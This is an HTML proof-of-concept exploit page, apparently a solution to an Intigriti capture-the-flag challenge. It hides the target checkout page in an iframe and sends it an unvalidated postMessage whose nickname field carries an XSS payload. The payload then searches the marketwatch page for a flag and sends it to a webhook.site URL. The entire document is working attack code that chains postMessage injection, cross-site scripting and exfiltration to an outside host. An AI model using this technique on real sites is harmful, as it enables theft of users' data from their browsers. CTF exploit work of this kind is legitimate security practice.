<!DOCTYPE html>
<body>
<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';

// Track admin visit
fetch(`${WEBHOOK}/?step=admin_visited_poc`);

// XSS payload with alert + flag exfiltration
const xss = `<img src=x onerror="
  alert('gigawatz');
  fetch('${WEBHOOK}/?xss_triggered=true');
  const html = document.body.innerHTML;
  const flag = html.match(/INTIGRITI{[^}]+}/);
  if (flag) fetch('${WEBHOOK}/?flag='+encodeURIComponent(flag[0]));
">`;

// Create iframe to checkout page
const iframe = document.createElement('iframe');
iframe.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
iframe.style.display = 'none';
document.body.appendChild(iframe);

iframe.onload = () => {
  setTimeout(() => {
    // Send malicious postMessage (no origin validation!)
    iframe.contentWindow.postMessage({
      type: 'submitTransaction',
      transaction: {
        nickname: xss,
        toAddress: '0x1337',
        currency: '1337COIN',
        amount: 1
      }
    }, '*');

    // Navigate to marketwatch where XSS triggers
    setTimeout(() => {
      window.location = `${BASE}/marketwatch.html`;
    }, 2000);
  }, 2000);
};
</script>
</body>
</html>
